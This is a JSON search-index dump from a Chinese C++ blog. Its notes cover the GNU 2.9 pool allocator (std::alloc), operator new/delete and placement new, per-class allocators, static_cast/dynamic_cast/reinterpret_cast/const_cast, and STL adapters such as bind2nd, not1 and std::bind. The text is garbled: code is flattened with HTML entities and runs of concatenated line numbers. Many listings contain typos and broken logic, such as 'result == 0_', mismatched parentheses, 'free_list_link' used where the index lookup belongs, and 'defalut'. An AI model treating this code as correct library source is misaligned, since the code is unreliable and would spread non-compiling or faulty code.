TRUE;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"stl","slug":"stl","permalink":"http://coordinate.wang/tags/stl/"}]},{"title":"std::allocator","slug":"2017-04-10-std_allocator","date":"2017-04-09T16:00:00.000Z","updated":"2018-02-18T03:29:06.088Z","comments":true,"path":"2017/04/10/2017-04-10-std_allocator/","link":"","permalink":"http://coordinate.wang/2017/04/10/2017-04-10-std_allocator/","excerpt":"","text":"在vc6的allocator只是以::operator new 和::operator delete 完成allocate()和deallocate(),没有任何特殊的设计。在bc5中的allocator只是以::operator new 和::operator delete 完成allocate()和deallocate(),没有任何特殊的设计。在G2.9中的allocator只是以::operator new 和::operator delete 完成allocate()和deallocate(),没有任何特殊的设计，但是它内部并没有使用，而是使用的std::alloc。在4.9版中叫__pool_alloc，但是这两个都不是标准分配器。 123456789101112131415// NB: __n is permitted to be 0. The C++ standard says nothing // about what the return value is when __n == 0.pointerallocate(size_type __n, const void* = 0)&#123; if (__builtin_expect(__n &gt; this-&gt;max_size(), false)) std::__throw_bad_alloc(); return static_cast&lt;_Tp*&gt;(::operator new(__n * sizeof(_Tp)));&#125;// __p is not permitted to be a null pointer.voiddeallocate(pointer __p, size_type)&#123; ::operator delete(__p); &#125; alloc的设计申请32bytes，由于pool为空，所以成功所求32202+RoundUp(0(目前的申请总量)&gt;&gt;4) =1280，从中切出一个，另外的19个给list#3，剩余640备用。每次分配前都是先看原先的是否有剩余pool，从pool切给出来的数量永远在1~20之间，pool余量不足够的时候，先将pool余量给相应的list#，然后索取相应的内存。当内存不够时，往右边找一块给他。如果就近找不到的话，就会失败。但是这样的话，还有很多的空内存未使用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174//第二级分配器 enum &#123; __ALIGN = 8 &#125;;//定义常量,小区快的下限 enum &#123; __MAX_BYTES = 128 &#125;;//上限 enum &#123; __NFREELISTS = __MAX_BYTES/ __ALIGN &#125;;//freelist的长度 template &lt;bool threads, int inst&gt; class __default_alloc_template &#123; private: static size_t ROUND_UP(size_t bytes) &#123; return ((bytes) + _ALIGN-1) &amp; ~(_ALIGN - 1)); &#125; private: union obj &#123; union obj* free_list_link; &#125;; private: static obj *volatile free_list[__NFREELISTS]; //计算list# static size_t FREELIST_INDEX(size_t bytes) &#123; return (((bytes) +__ALIGN-1)/__ALIGN-1); &#125; static void* refill(size_t n); static char *chunk_alloc(size_t size, int &amp;nobjs); static char *start_free;//指向pool头 static char *end_free;//指向pool尾 static size_t heap_size; public: static void* allocate(size_t n) &#123; obj* volatile *my_free_list; obj* result; if(n &gt; (size_t) __MAX_BYTES)//改用第一级 &#123; return (malloc_alloc::allocate(n)); &#125; my_free_list = free_list + FREELIST_INDEX(n); result = *my_free_list; if(result == 0_ &#123; void* r = refill(ROUND_UP(n)); return r; &#125; *my_free_list = result-&gt;free_list_link; return (result); &#125; //回收的时候，把要回收的部分插入二级链表的头 //函数内部没有做p指针的检查，如果这个p指针不是这个系统的， //如果他不是8的倍数的话，回收后再分配时会出问题，原来分配给list#1， //可能现在到了list#2 static void deallocate(void* p,size_t n) &#123; obj* q = (obj*)p; obj* volatile *my_free_list; if(n &gt; (size_t)__MAX_BYTES) &#123; malloc_alloc::deallocate(p,n); return; &#125; my_free_list = free_list +FREELIST_INDEX(n); q-&gt;free_list_link = *my_free_list; *my_free_list = q; &#125; static void* reallocate(void* p, size_t old_sz, size_t new_sz);//略 &#125;; template &lt;bool threads, int inst&gt; char * __default_alloc_template&lt;threads, inst&gt;:: chunk_alloc(size_t size, int&amp; nobjs) &#123; char *result; size_t total_bytes = size * nobjs; size_t bytes_left = end_free - start_free; if( bytes_left &gt;= total_bytes)//pool能否满足20个 &#123; result = start_free; start_free += total_bytes; return(result); &#125; else if( bytes_left &gt;= size)//pool能否满足1个 &#123; nobjs = bytes_left /size; total_bytes = size * nobjs; result = start_free; start_free += total_bytes; return(result); &#125; else &#123; //空pool或者为碎片 size_t bytes_to_get = 2*total_bytes + ROUND_UP(heap_size &gt;&gt; 4); //将碎片挂接 if( bytes_left &gt; 0) &#123; obj* volatile *my_free_list = free_list + FREELIST_INDEX(bytes_left); ((obj*)start_free)-&gt;free_list_link = *my_free_list; *my_free_list = (obj*)start_free; &#125; //分配内存 start_free = (char *)malloc(bytes_to_get); if( 0 == start_free)//分配失败的话，从freelist中找 &#123; int i; obj* volatile *my_free_list, *p;//try to make do with what we have.that can’t hurt.//we do not try smaller requests,since that tends//to result in disaster on muti-process machines. for( i = size; i &lt;= __MAX_BYTES; i+= __ALIGN) &#123; my_free_list = free_list + FREELIST_INDEX(i); p = *my_free_list; if( 0 != p) &#123; *my_free_list = p-&gt;free_list_link; start_free = (char *)p; end_free = start_free + i; return (chunk_alloc(size, nobjs)); &#125; &#125; //表示memory已经‘没有’了 end_free = 0; start_free = (char*)malloc_alloc::allocate(bytes_to_get); &#125; heap_size += bytes_to_get; end_free = start_free + bytes_to_get; return (chunk_alloc(size, nobjs)); &#125; &#125; template &lt;bool threads, int inst&gt; void * __default_alloc_template&lt;threads, inst&gt;::refill(size_t n)//n已经是8的倍数 &#123; int nobjs = 20;//预设20个 char *chunk = chunk_alloc(n, nobjs); obj* volatile *my_free_list; obj* result; obj* current_obj; obj* next_obj; int i; if( 1== nobjs) return (chunk); my_free_list = free_list_link; result = (obj*)chunk; *my_free_list = next_obj = (obj*)(chunk + n); //在chunk内建立freelist for( i = 1; ; ++i) &#123; current_obj = next_obj; next_obj = (obj*)((char*)next_obj + n); if( nobjs-1 == i) &#123; current_obj-&gt;free_list_link = 0; break; &#125; else &#123; current_obj-&gt;free_list_link = next_obj; &#125; &#125; return (result); &#125;template &lt;bool threads, int inst&gt;char *__default_alloc_template&lt;threads, inst&gt;;:start_free = 0;template &lt;bool threads, int inst&gt;char *__default_alloc_template&lt;threads, inst&gt;;:end_free = 0;template &lt;bool threads, int inst&gt;char *__default_alloc_template&lt;threads, inst&gt;;:heap_free = 0;template &lt;bool threads, int inst&gt;__default_alloc_template&lt;threads, inst&gt;::obj* volatile__default_alloc_template&lt;threads, inst&gt;::free_list[_NFREELISTS]= &#123; 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0&#125;typedef __default_alloc_template&lt;false, 0&gt; alloc; deallocate完全没有free，设计上的缺陷，没有变量记录freelist的起始位置","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"stl","slug":"stl","permalink":"http://coordinate.wang/tags/stl/"}]},{"title":"内存管理 primitives","slug":"2017-04-09-内存管理primitives","date":"2017-04-08T16:00:00.000Z","updated":"2018-02-18T03:29:06.073Z","comments":true,"path":"2017/04/09/2017-04-09-内存管理primitives/","link":"","permalink":"http://coordinate.wang/2017/04/09/2017-04-09-内存管理primitives/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132void *p1 = malloc(512);free(p1);complex&lt;int&gt; *p2 = new complex&lt;int&gt;;delete p2;void *p3 = ::operator new(512);::operator delete(p3);#ifdef _MSR_VER//以下两个函数都是non-static，一定要通过object调用int *p4 = allocator&lt;int&gt;().allocate(3, (int*)0);allocator&lt;int&gt;().deallocate(p4, 3);#endif#ifdef __BORLANDC__//以下两个函数都是non-static，一定要通过object调用int *p4 = allocator&lt;int&gt;().allocate(5);allocator&lt;int&gt;().deallocate(p4, 5);#endif#ifdef __GNUC__//以下两个函数都是static，可以通过全名调用，2.9vervoid *p4 = alloc::allocate(512);alloc::deallocate(p4, 512);//4.9ver 以下两个函数都是non-static，一定要通过object调用void *p4 = allocator&lt;int&gt;().allocate(7);allocator&lt;int&gt;().deallocate((int*)p4, 7);void *p5 = __gnu_cxx::__pool_alloc&lt;int&gt;().allocate(9);__gnu_cxx::__pool_alloc&lt;int&gt;.deallocate((int*)p5, 9);#endif New expression1234567891011121314151617181920212223242526272829void *mem = operator new(sizeof(Complex));pc = static_cast&lt;Complex*&gt;(mem);pc-&gt;Complex::Complex(1,2);//只有编译器可以这样调用ctor//想要直接调用ctor，可以运用placement new；//new(p)Complex(1,2);void *operator new(size_t size, const std::nothrow _t&amp;) _THROW0()//nothrow struct is used as a function parameter to operator new to //indicate that the function should return a null pointer to report//an allocation failure ,rather than throw an exception&#123; // try to allocate size bytes void *p; while ((p = malloc(size)) == 0) if (_callnewh(size) == 0) &#123; // report no memory _THROW_NCEE(_XSTD bad_alloc, ); &#125; return (p);&#125;delete expressionComplex* pc = new Complex(1,2);...delete pc;pc-&gt;~Complex();operator delete(pc);void __cdecl operator delete(void *p)_THROW0()&#123; free(p);&#125; Array new,array delete12345678Complex *pca = new Complex[3];//唤起3次ctor...delete[] pca;//唤起3次dtor//一下做法会造成内存泄漏，string的内部有指针string *psa = new string[3];...delete psa; 12int *pi = new int[10];delete pi; 61h为cookie，用来记录空间的大小，最后一个字节用来记录内存是在使用，还是未使用 12Demo *p = new Demo[3];delete [] p; 第一个p指向的地址是00481c30，第二个p指向的地址是00481c34，如果写成delete p;的话，那么会从第一个p开始而不是第二个，就会出问题，多出一个3，这个3表示调用几次析构。如果Demo没有nontrivial dtor ,就不会记录3，也就是说，和上面的int类似，可以不加[]。关于内存空间，必须要调节16的倍数，所以增加了pad这个东西。 Placement newPlacement new 允许我们将object建立于 allocated memory中没有所谓的placement delete，因为placement new根本没有分配memory亦或称呼placement new 对应的operator delete为placement delete 1234567891011#include &lt;new&gt;char *buf = new char[sizeof(Complex)*3];Complex *pc = new(buf)Complex(1,2);//等同于调用构造函数void *mem = operator new(sizeof(Complex));//没有做任何事void *operator new (size_t ,void *loc)&#123; return loc; &#125;pc = static_cast&lt;Complex*&gt;(mem);pc-&gt;Complex::Complex(1,2);delete[] buf; 关于placement new，或指为new(p)，或指为::operator new(size, void*) 重载重载::operator new/::operator delete12345678void *myAlloc(size_t size)&#123; return malloc(size); &#125;void myAlloc(void *ptr)&#123; return free(ptr); &#125;inline void* operator new(size_t size) &#123;&#125;inline void* operator new[](size_t size) &#123;&#125;inline void operator delete(size_t size) &#123;&#125;inline void operator delete[](size_t size) &#123;&#125; 重载operator new/operator delete12345678910Foo *p = new Foo;...delete p;class Foo&#123;public: void *operator new (size_t); void operator delete(void*, size_t);&#125;; 重载operator new[]/operator delete[]12345678910Foo *p = new Foo[n];...Delete[] p;class Foo&#123;public: void *operator new[] (size_t); void operator delete[](void*, size_t);&#125;; 重载new()/delete()我们重载class member operator new(),前提是每一个版本的声明都必须是独特的参数列，其中第一个参数必须是size_t，其余参数以new所指定的placement arguments为初值.出现new()小括号内的便是所谓的placement argument 1234567Foo *pf = new (300,'c') Foo;//第一个参数表所示Foo的大小//一般重载void *operator new(size_t size)&#123; return malloc(size); &#125;//placement new()的标准写法void *operator new(size_t size, void *start)&#123; return start; &#125; 我们也可以重载class member operator delete(),但是他们不会被delete调用。只有当new所调用的ctor抛出异常，才会带调用这些重载版的operator delete()。他只能这样被调用，主要用来clean未完成创建的object所占的memory。即使operator delete() 未能一一对应operator new() ,编译器也不会报错，这样做的意思是放弃处理ctor发出的异常。 Basic_string使用new(extra)平时使用的string就是typdef 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150template&lt;...&gt;class basic_string&#123;private: struct Rep &#123; void release() &#123; if( --ref == 0) delete this;&#125; inline static void* operator new(size_t, size_t); inline static void* operator delete(void *); inline static Rep* create(size_t); ... &#125;; ...&#125;;template&lt;class charT, class traits, class Allocator&gt;inline basic_string&lt;charT, traits, Allocator&gt;::Rep*basic_string&lt;charT, traits, Allocator&gt;::Rep::create(size_t extra)&#123; extra = frob_size(extra + 1); Rep *p = new(extra) Rep; ... return p;&#125;template&lt;class charT, class traits, class Allocator&gt;inline void *basic_string&lt;charT, traits, Allocator&gt;::Rep::operator new (size_t s,size_t extra)&#123; return Allocator::allocate(s + extra * sizeof();//placement new的重载&#125;template&lt;class charT, class traits, class Allocator&gt;inline void basic_string&lt;charT, traits, Allocator&gt;::Rep::opreraotr delete(void *ptr)&#123; Allocator::deallocate(ptr...&#125;Pre-class allocator，1#include &lt;cstddef&gt;#include &lt;iostream&gt;using namespace std;class Screen&#123;public: Screen(int x) :i(x) &#123;&#125;; int get() &#123; return i; &#125; void *operator new(size_t); void operator delete(void*, size_t);private: Screen *next; static Screen *freeStore; static const int screenChunk;private: int i;&#125;;//Screen *Screen::freeSore = 0;const int Screen::screenChunk = 24;void *Screen::operator new(size_t size)&#123; Screen *p;//这种设计多用了一个指针 if(!freeStore) &#123; size_t chunk = screenChunk *size; freeStore = p = reinterpret_cast&lt;Screen*&gt;(new char [chunk]);//将一大块分割后，用链表穿起来 for(; p!= &amp;freeStore[screenChunk-1]; ++p) p-&gt;next = p +1; p-&gt;next = 0; &#125; p = freeStore; freeStore = freeStore-&gt;next; return p;&#125;void Screen::operator delete(void *p,size_t)&#123;//将delete object插回 (static_cast &lt;Screen*&gt;(p))-&gt;next = freeStore; freeStore = static_cast&lt;Screen*&gt;(p);&#125; Pre-class allocator，2class Airplane&#123;private: struct AirplaneRep &#123; unsigned long miles; char type; &#125;;private: union &#123; AirplaneRep rep; Airplane *next;//嵌入式指针，相对于前面的来说非常不错 &#125;;//一个union 只配置一个足够大的空间以来容纳最大长度的数据成员，以上例而言，最大长//度是AirplaneRep型态。//在C++里，union 的成员默认属性页为public。union 主要用来压缩空间。如果一些数//据不可能在同一时间同时被用到，则可以使用union。public: unsigned long getMiles() &#123; return rep.miles;&#125; char getType() &#123; return rep.type; &#125; void set(unsigned long m, char t) &#123; rep.miles = m; rep.type = t; &#125; static void *opertor new(size_t size);//注意这里static，编译器默认也是static，原因在于，要在对象创建时调用，//如果不是static，对象创建时，可能这个东西还在创建的过程中 static void operator delete(void *deadObject, size_t size);private: static const int BLOCK_SIZE; static Airplane *headOfFreeList;&#125;;Airplane *Airplane::headOfFreeList;const int Airplane::BLOCK_SIZE=512;void *Airplane::operator new(size_t size)&#123;//当继承发生时 if(size != sizeof(Airplane)) return ::operator new(size); Airplane *p = headOfFreeList; if(p) headOfFreeList = p-&gt;next; else &#123; Airplane *newBlock = static_cast&lt;Airplane*&gt; (::operator new(BLOCK_SIZE * sizeof(Airplane)); for(int i = 1; i &lt;BLOCK_SIZE - 1;++i) newBlock[i].next = &amp;newBlock[i+1]; newBlock[BLOCK_SIZE-1].next = 0; p = newBlock; headOfFreeList = &amp;newBlock[1]; &#125; return p;&#125;void Airplane::operator delete(void *deadObject, size_t size)&#123; if(deadObject == 0) return; if(size != sizeof(Airplane)) &#123; ::operator delete(deadObject); return; &#125; Airplane *carcass = static_cast&lt;Airplane*&gt;(deadObject); carcass-&gt;next = headOfFreeList; headOfFreeList = carcass;&#125; static allocator不同的class重写一遍几乎相同member operator new和member operator delete时，应该有方法将他们统一在一起，是他可以重用。 12345678910111213141516171819202122232425262728293031323334353637class allocator&#123;private: struct obj &#123; struct obj* next;//与linux里的链表做法一样 &#125;public: void *allocate(size_t); void deallocate(void*, size_t);private: obj* freeStore = nullptr; const int CHUNK = 5;&#125;;void *allocator::allocate(size_t size)&#123; obj *p; if(!freeStore) &#123; size_t chunk = CHUNK *size; freeStore = p = (obj*)malloc(chunk); for(int i = 0; i &lt; (CHUNK-1); +i) &#123; p-&gt;next = (obj*)((char*)p+size); p = p-&gt;next; &#125; p-&gt;next = nullptr; &#125; p = freeStore; freeStore = freeStore-&gt;next; return p;&#125;void deallocate(void *p, size_t)&#123; ((obj*)p)-&gt;next = freeStore; freeStore = (obj*)p;&#125; 此时Foo可以这样写了 12345678910class Foo&#123;public: static allocator myAlloc;public: static void *operator new (size_t size) &#123; return myAlloc.allocate(size); &#125; static void operator delete(void* pHead, size_t size); &#123; return myAlloc.deallocate(pHead, size); &#125;&#125;; 这样做就方便了很多 Macro for static allocator12345678910\\表示续行符#define DECLARE_POOL_ALLOC()\\public:\\ void *operator new(size_t size) &#123; return myAlloc.allocate(size); &#125;\\ void operator delete(void *p) &#123; myAlloc.deallocate(p, 0); &#125;\\protected:\\ static allocator myAlloc; #define IMPLEMENT_POOL_ALLOC(class_name)\\allocator class_name::myAlloc; 原来的变成如下形式 12345678910class Foo&#123; DECLARE_POOL_ALLOC()public: long L; string str;public: Foo(long l) : L(l) &#123;&#125;&#125;;IMPLEMENT_POOL_ALLOC(Foo) New handler当operator new 没有能力分配申请的memory，会抛出异常std::bad_alloc execption以仍然可以让编译器new(nothrow) Foo;抛出异常之前会调用一个可由client指定的handler，以下是new handler的形式和设定方法： 12typedef void(*new_handler)();new_handler set_new_handler(new_handler p) throw(); 设计良好的new handler只有俩个选择：让更多的memory可用 调用abort()和exit() =default,=deleteIt is not only for ctor and assignments,but also apllies to operator new/new[],operator delete/delete[] and their overloads 12345678class Foo&#123;public: Foo() = default;//表示使用默认版本，如果没有的话使用编译器合成版 Foo(const Foo&amp;)=delete;//表示不使用这个函数 Foo&amp; operator=(const Foo&amp;)=delete; ~Foo()=defalut;&#125;;","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"stl","slug":"stl","permalink":"http://coordinate.wang/tags/stl/"}]},{"title":"static_cast,dynamic_cast,reinterpret_cast和const_cast","slug":"2017-04-08-cast","date":"2017-04-07T16:00:00.000Z","updated":"2018-02-18T03:29:06.057Z","comments":true,"path":"2017/04/08/2017-04-08-cast/","link":"","permalink":"http://coordinate.wang/2017/04/08/2017-04-08-cast/","excerpt":"","text":"在简单的情况下，上面这种类型转换可以很好地工作，但在C++中往往还是不够的，为此ANSI-C++新标准定义的四个转换符，即static_cast、dynamic_cast、reinterpret_cast和const_cast。同时在C++环境中，原先的C-Style的类型转换仍旧可以使用。 static_cast用法：static_cast \\&lt;typeid> (expression)说明：该运算符把expression转换为typeid类型，但没有运行时类型检查来确保转换的安全性。用途： 用于类层次结构中基类和派生类之间指针或者引用的转换。up-casting (把派生类的指针或引用转换成基类的指针或者引用表示)是安全的；down-casting(把基类指针或引用转换成子类的指针或者引用)是不安全的。 用于基本数据类型之间的转换，如把int转换成char，这种转换的安全性也要由开发人员来保证。 可以把空指针转换成目标类型的空指针(null pointer)。 把任何类型的表达式转换成void类型。注意： static_cast不能转换掉expression的const、volitale或者__unaligned属性。 dynamic_cast用法：dynamic_cast\\&lt;typeid> (expression)说明：该运算符把expression转换成typeid类型的对象。typeid必须是类的指针、类的引用或者void*。如果typeid是类的指针类型，那么expression也必须是指针，如果typeid是一个引用，那么expression也必须是一个引用。一般情况下，dynamic_cast用于具有多态性的类(即有虚函数的类)的类型转换。 dynamic_cast依赖于RTTI信息，其次，在转换时，dynamic_cast会检查转换的source对象是否真的可以转换成target类型，这种检查不是语法上的，而是真实情况的检查。先看RTTI相关部分，通常，许多编译器都是通过vtable找到对象的RTTI信息的，这也就意味着，如果基类没有虚方法，也就无法判断一个基类指针变量所指对象的真实类型，这时候，dynamic_cast只能用来做安全的转换,例如从派生类指针转换成基类指针。而这种转换其实并不需要dynamic_cast参与。也就是说,dynamic_cast是根据RTTI记载的信息来判断类型转换是否合法的。 用途：主要用于类层次之间的up-casting和down-casting，还可以用于类之间的交叉转换。在进行down-casting时，dynamic_cast具有类型检查的功能，比static_cast更安全。检测在运行时进行。如果被转换的指针不是一个被请求的有效完整的对象指针，返回值为NULL。当用于多态类型时，它允许任意的隐式类型转换以及相反过程。不过，与static_cast不同，在后一种情况里（注：即隐式转 换的相反过程），dynamic_cast会检查操作是否有效。也就是说，它会检查转换是否会返回一个被请求的有效的完整对象。注意：dynamic_cast不能转换掉expression的const、volitale或者__unaligned属性。 reinterpret_cast用法：reinterpret_cast \\&lt;typeid>(expression)说明：转换一个指针为其他类型的指针，也允许将一个指针转换为整数类型，反之亦然。这个操作符能够在非相关的类型之间进行转换。操作结果只是简单的从一个指针到别的指针的值的二进制拷贝，在类型之间指向的内容不做任何类型的检查和转换。这是一个强制转换。使用时有很大的风险，慎用之。注意：reinterpret _cast不能转换掉expression的const、volitale或者__unaligned属性。 const_cast用法：const_cast\\&lt;typeid>(expression)说明：这个类型操纵传递对象的const属性，或者是设置或者是移除。如： 123Class C&#123;…&#125;const C* a = new C;C* b = const_cast&lt;C*&gt;(a); 如果将上面的const_cast转换成其他任何其他的转换，编译都不能通过，出错的信心大致如下： “…cannot convert from ‘const class C ‘ to ‘class C ‘”。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt; using namespace std; class Base &#123; public: int _base; virtual void printinfo() &#123; cout &lt;&lt; _base &lt;&lt; endl; &#125; &#125;; class Derived : public Base &#123; public: int _derived; virtual void printinfo() &#123; cout &lt;&lt; _derived &lt;&lt; endl; &#125; &#125;; int main(void) &#123; Base b1; Derived d1; int aInt = 10; long aLong = 11; float aFloat = 11.11f; double aDouble = 12.12; Derived* pd = static_cast&lt;Derived*&gt;(&amp;b1); // down-casting 不安全 Base* pb = static_cast&lt;Base*&gt;(&amp;d1); // up-casting 安全 Derived&amp; d = static_cast&lt;Derived&amp;&gt;(b1); // down-casting 不安全 Base&amp; b = static_cast&lt;Base&amp;&gt;(d1); // up-casting 安全 aInt = static_cast&lt;int&gt;(aFloat); // 基本数据类型转换 void* sth = static_cast&lt;void*&gt;(&amp;aDouble); // 将double指针类型转换成void指针类型 double* bDouble = static_cast&lt;double*&gt;(sth);// 将void指针类型转换成double指针类型 cout &lt;&lt; *bDouble &lt;&lt; endl; Base* pb1 = dynamic_cast&lt;Base*&gt;(&amp;d1); //Derived* pd1 = dynamic_cast&lt;Derived*&gt;(&amp;b1); // 编译时有warning，运行时出错 int bInt = reinterpret_cast&lt;int&gt;(pb1); // 将地址或指针转换成整数 cout &lt;&lt; bInt &lt;&lt; endl; pb1 = reinterpret_cast&lt;Base*&gt;(bInt); // 将整数转换成地址或指针 int* cInt = reinterpret_cast&lt;int*&gt;(&amp;aFloat);// 这个转换的结果会出乎意料 cout &lt;&lt; (int)*cInt &lt;&lt; endl; const Base* bBase = new Base(); Base* cBase = const_cast&lt;Base*&gt;(bBase); //Base* dBase = dynamic_cast&lt;Base*&gt;(bBase); // 不能通过编译 //Base* eBase = static_cast&lt;Base*&gt;(bBase); // 不能通过编译 //Base* fBase = reinterpret_cast&lt;Base*&gt;(bBase); // 不能通过编译 return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"stl","slug":"stl","permalink":"http://coordinate.wang/tags/stl/"}]},{"title":"分配器 allocators","slug":"2017-04-06-分配器","date":"2017-04-05T16:00:00.000Z","updated":"2018-02-18T03:29:06.057Z","comments":true,"path":"2017/04/06/2017-04-06-分配器/","link":"","permalink":"http://coordinate.wang/2017/04/06/2017-04-06-分配器/","excerpt":"","text":"1234567891011121314151617181920template&lt;typename _Tp, typename _Alloc = std::allocator&lt;_Tp&gt;&gt;class vector:protected _Vector_base&lt;_Tp, _Alloc&gt;template&lt;typename _Tp, typename _Alloc = std::allocator&lt;_Tp&gt;&gt;class list:protected _List_base&lt;_Tp, _Alloc&gt;template&lt;typename _Tp, typename _Alloc = std::allocator&lt;_Tp&gt;&gt;class deque:protected _Deque_base&lt;_Tp, _Alloc&gt;template&lt;typename _Key, typename _Compare = std::less&lt;_Key&gt;, typenaem _Alloc = std::allocator&lt;_Key&gt;&gt;class settemplate&lt;typename _Key, typename _Tp, typename _Compare = std::less&lt;_Key&gt;, typename _Alloc = std::allocator&lt;std::pair&lt;const _Key, _Tp&gt;&gt;class maptemplate&lt;class _Value, class _Hash = bash&lt;_Value&gt;, class _Pred = std::equal_to&lt;_Value&gt;, class _Alloc = std::allocator&lt;_Value&gt;&gt;class unordered_settemplate&lt;class _Value, class _Hash = bash&lt;_Value&gt;, class _Pred = std::equal_to&lt;_Key&gt;, class _Alloc = std::allocator&lt;_Value&gt;&gt;class unordered_map 一般写法 1234int *p;allocator&lt;int&gt; alloc1;p = alloc.allocate(1);alloc1.deallocate(p, 1); 特殊写法 12345__gnu_cxx::malloc_allocator&lt;int&gt; alloc2;__gnu_cxx::new_allocator&lt;int&gt; alloc2;__gnu_cxx::__pool_allocator&lt;int&gt; alloc2;__gnu_cxx::__mt_allocator&lt;int&gt; alloc2;__gnu_cxx::bitmap_allocator&lt;int&gt; alloc2; 不建议用分配器，应该用容器，new malloc","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"stl","slug":"stl","permalink":"http://coordinate.wang/tags/stl/"},{"name":"分配器","slug":"分配器","permalink":"http://coordinate.wang/tags/分配器/"}]},{"title":"适配器 adapters","slug":"2017-04-04-适配器","date":"2017-04-03T16:00:00.000Z","updated":"2018-02-18T03:29:06.047Z","comments":true,"path":"2017/04/04/2017-04-04-适配器/","link":"","permalink":"http://coordinate.wang/2017/04/04/2017-04-04-适配器/","excerpt":"","text":"容器的适配器：stack，queue12345678910111213141516171819template &lt;class T, class Sequence=deque&lt;T&gt;&gt;class stack&#123;...public: typedef typename Sequence::value_type value_type; typedef typename Sequence::size_type size_type; typedef typename Sequence::reference reference; typedef typename Sequence::const_reference const_reference;protected: Sequence c;//底层容器dequepublic: bool empty() const &#123; return c.empty(); &#125; size_type size() const &#123; return c.size(); &#125; reference top() &#123; return c.back(); &#125; const_reference top() const &#123; return c.back(); &#125; void push(const value_type&amp; x) &#123; c.push_back(x); &#125; void pop() &#123; c.pop_back(); &#125;&#125;; 函数适配器binder2nd12345678910111213141516171819202122232425template &lt;class Operation, class T&gt;inline binder2nd&lt;Operation&gt; bind2nd (const Operation&amp; op, const T&amp; x)&#123;//辅助函数，让user更方便的使用binder2nd typedef typename Operation::second_argument_type arg2_type;//typename 原因在于不知道后面的类型，所以要告诉编译器他是一个typename return binder2nd&lt;Operation&gt;(op, arg2_type(x));&#125;template &lt;class Operation&gt;class bind2nd :public unary_function&lt;typename Operation::first_argument_type, typename Operation::result_type&gt;//注意这里的继承，如果这个functor还可以被别人使用的话&#123;protected: Operation op;//内部成员 typename Operation::second_argument_type value;public: binder2nd(const Operation&amp; x, const typename Operation::second_argument_type) : op(x), value(y) &#123;&#125; typename Operation::result_type operator()(const typename Operation::first_argument_type&amp; x) const &#123; return op(x, value); &#125;&#125;; 函数适配器not11234567891011121314151617template &lt;class Predicate&gt;inline unary_negate&lt;Predicate&gt;not1(const Predicate&amp; pred)&#123; return unary_negate&lt;Predicate&gt;(pred);&#125;template &lt;class Predicate&gt;class unary_negate:public unary_function&lt;typename Predicate::argument_type, bool&gt;&#123;protected: Predicate pred;public://explicit关键字的作用就是防止类构造函数的隐式自动转换 explicit unary_negate(const Predicate&amp; x) : pred(x) &#123;&#125; bool operator()(const typename Predicate::argument_type&amp; x) const &#123; return !pred(x); &#125;&#125;; 新型适配器bindSince c++11 bind —–&gt;binder1st bind —–&gt;binder2nd bind —–&gt;bind1st bind —–&gt;bind2nd 可以绑定 functions functions objects member functions ，_1必须是某个object的地址 data members，_1必须是某个object的地址 12345678910111213141516171819202122232425262728293031323334353637// bind example#include &lt;iostream&gt; // std::cout#include &lt;functional&gt; // std::bind// a function: (also works with function object: std::divides&lt;double&gt; my_divide;)double my_divide (double x, double y) &#123;return x/y;&#125;struct MyPair&#123; double a,b; double multiply() &#123;return a*b;&#125;&#125;;int main () &#123; using namespace std::placeholders; // adds visibility of _1, _2, _3,...占位符 // binding functions: auto fn_five = std::bind (my_divide,10,2); // returns 10/2 std::cout &lt;&lt; fn_five() &lt;&lt; '\\n'; // 5 auto fn_half = std::bind (my_divide,_1,2); // returns x/2 std::cout &lt;&lt; fn_half(10) &lt;&lt; '\\n'; // 5 auto fn_invert = std::bind (my_divide,_2,_1); // returns y/x std::cout &lt;&lt; fn_invert(10,2) &lt;&lt; '\\n'; // 0.2 auto fn_rounding = std::bind&lt;int&gt; (my_divide,_1,_2); // returns int(x/y) std::cout &lt;&lt; fn_rounding(10,3) &lt;&lt; '\\n'; // 3 MyPair ten_two &#123;10,2&#125;; // binding members: auto bound_member_fn = std::bind (&amp;MyPair::multiply,_1); // returns x.multiply() std::cout &lt;&lt; bound_member_fn(ten_two) &lt;&lt; '\\n'; // 20 auto bound_member_data = std::bind (&amp;MyPair::a,ten_two); // returns ten_two.a std::cout &lt;&lt; bound_member_data() &lt;&lt; '\\n'; // 10 return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"stl","slug":"stl","permalink":"http://coordinate.wang/tags/stl/"},{"name":"适配器","slug":"适配器","permalink":"http://coordinate.wang/tags/适配器/"}]},{"title":"仿函数 